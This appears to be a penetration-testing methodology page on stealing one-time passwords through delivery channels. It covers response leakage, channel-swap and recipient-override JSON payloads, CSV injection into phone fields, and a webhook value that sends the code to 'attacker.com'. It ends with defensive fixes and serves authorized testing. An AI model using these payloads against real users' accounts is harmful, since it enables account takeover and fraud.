# Delivery Channel Exploitation

The OTP must travel from server to user. Every step of that journey — generation, transport, storage, display — is an attack surface.

## Server-side leakage

### Response body
Inspect the OTP-issue response for the OTP itself. Sounds absurd; happens constantly.

```
POST /api/otp/send
{"phone":"+1..."}

← {"success":true,"otp":"482913","ttl":300}        ← jackpot
← {"success":true,"debug":{"sent_code":"482913"}}  ← dev flag left on
← {"success":true,"hash":"a3d4..."}                ← MD5 of OTP, crackable
← {"success":true,"messageId":"sms-482913-xyz"}    ← OTP embedded in id
```

Also check:
- HTTP response headers (`X-Debug-OTP:`, `X-Last-Code:`).
- Set-Cookie values (some apps cookie the OTP for "convenience").
- Redirect URLs (`Location: /verify?prefill=482913`).
- GraphQL error messages ("Expected 482913, got 000000").
- Verbose error envelopes on the **verify** endpoint after a wrong attempt — sometimes echo the expected value.

### Client-side rendering
The page HTML / JS bundle may include the OTP for "autofill demo" purposes or because the same template renders dev and prod.
- View source on the verify page after OTP request — search for 6-digit sequences.
- Inspect WebSocket / SSE streams pushed to the page; some apps push the OTP for in-app display on the same device.
- Mobile: dump the app's logcat / NSLog; many apps log the OTP at INFO level. Frida-hook the OTP-receiver to extract.

### Cache / CDN
- A logged-out hit to `/api/otp/last?user=victim` cached by CDN — yes, this has shipped.
- Browser back-button revealing the previous form's OTP value.

## Channel swap

The user is supposed to receive the OTP via channel X (their phone). Force the server to use channel Y (your inbox/phone).

### Recipe: change the channel parameter
```
POST /send-otp
{"userId":"victim","channel":"sms"}        → goes to victim's phone (no help)

{"userId":"victim","channel":"email"}      → goes to victim's email (still no help)

{"userId":"victim","channel":"sms","phone":"+1ATTACKER"}    ← injection point
{"userId":"victim","channel":"email","email":"attacker@x"}  ← injection point
{"userId":"victim","channel":"webhook","url":"https://attacker.com/c"}  ← if dev channel left on
{"userId":"victim","channel":"voice","phone":"+1ATTACKER"}
```

Try also: `delivery`, `medium`, `via`, `transport`, `notification_type`.

### Recipe: recipient override
The server reads the recipient from the request body instead of the stored user profile.
1. `POST /send-otp` with `{"userId":"victim", "phone":"+1ATTACKER"}` — OTP comes to attacker.
2. Variations: `email`, `mobile`, `msisdn`, `to`, `recipient`, `destination`, `target_phone`.

### Recipe: CSV / array injection
Some SMS gateway integrations split on `,` or `;`:
```
"phone": "+1victim,+1attacker"
"phone": "+1victim;+1attacker"
"phone": ["+1victim","+1attacker"]
"phone": "+1victim\n+1attacker"
```
If the backend forwards the whole field to the gateway, attacker receives the same OTP.

### Recipe: header / locale-based routing
Some apps pick the channel based on `Accept-Language`, `X-Client-Type`, or `User-Agent` (e.g., "mobile app → push notification, web → SMS"). Force the easier-to-intercept channel by setting the right header.

## Push-notification preview

iOS / Android lockscreen previews show OTP contents unless the app marks the notification as sensitive. Combine with brief physical access or a smartwatch mirroring the lockscreen.

Out of scope for remote attackers, but record as a finding for threat models that include shoulder-surfing or evil-maid.

## SIM swap & SS7

Telco-layer. Out of scope for app-layer pentests but important to mention:
- Tell the customer that SMS OTP is not phishing-resistant; recommend TOTP / WebAuthn for high-value accounts.
- For fraud assessments, recommend velocity-rules on "recent SIM change → block OTP for 24h."

## Predictable OTP generation

If you can issue OTPs at will (to your own account), collect 20–50 codes and inspect:
- Strict monotonicity (`100001, 100002, ...`) → generator is a counter, predict the next.
- Coarse timestamp seeding (`int(time.time())%1000000`) → predictable to anyone with a clock.
- Modulo of `user_id` or `request_id` → trivially predictable per account.
- Same OTP for everyone in the same second → broken PRNG.

Statistical test on the collected sample:
```python
# chi-square on digit distribution
from collections import Counter
codes = ["482913","100204",...]
digits = Counter("".join(codes))
# expected ~1/10 each; large deviation = biased generator
```

Also: low entropy in the *seed* (e.g., 32-bit `time(0)` seeded `srand` in PHP) means you can replay the OTP given the issuance second.

## Race between issue and delivery

For high-value transactions: the OTP exists in the database before the SMS gateway sends it. If you can read the database (SQLi, exposed admin), or read internal queues (exposed Redis, RabbitMQ), the OTP is there before the user's phone rings.

## Side-channel: voicemail / transcription

Voice-OTP delivery + carrier voicemail = OTP is transcribed and emailed to the victim. Compromise of the email (or the carrier's voicemail PIN, often `0000`) yields the OTP.

## Confirmation

For each leak vector, the proof is: attacker receives / reads the OTP that was issued for the victim, then completes a privileged action on victim's account. Use two accounts you own — never intercept a real user's channel.

## Defensive note

- Never return the OTP value or its hash in any response body or log.
- Pin the recipient at OTP issuance to the *stored* profile value, not a request parameter. If a request includes a `phone`/`email` field, ignore it for OTP issuance.
- Use cryptographically strong RNG (`secrets.randbelow(10**6)`), not `time()`-seeded `rand()`.
- Disable lockscreen previews for OTP notifications (`UNNotificationContent.userInfo` with `apns-push-type: alert` and content-hidden).
- For high-value flows, require channel-binding: OTP sent to phone → verify must also include knowledge of an email-delivered token. Defeats single-channel compromise.
- Strip / reject multi-valued recipient fields at the API gateway before they reach the SMS provider.
